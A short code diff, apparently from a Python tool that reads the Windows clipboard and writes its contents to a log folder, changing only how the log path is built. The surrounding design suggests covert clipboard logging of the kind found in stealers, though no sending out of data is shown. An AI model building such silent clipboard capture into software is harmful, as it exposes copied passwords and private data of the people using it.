@@ -4,8 +4,7 @@ from manager.logger import Log
 from preferences.config import config
 
 def ClipBoard():
-    user = environ['USERPROFILE']
-    pathToLogs = f'{user}\\{config.pathToLogs}\\System'
+    pathToLogs = f'{config.pathToLogs}\\System'
     try:
         OpenClipboard()
         data = GetClipboardData()
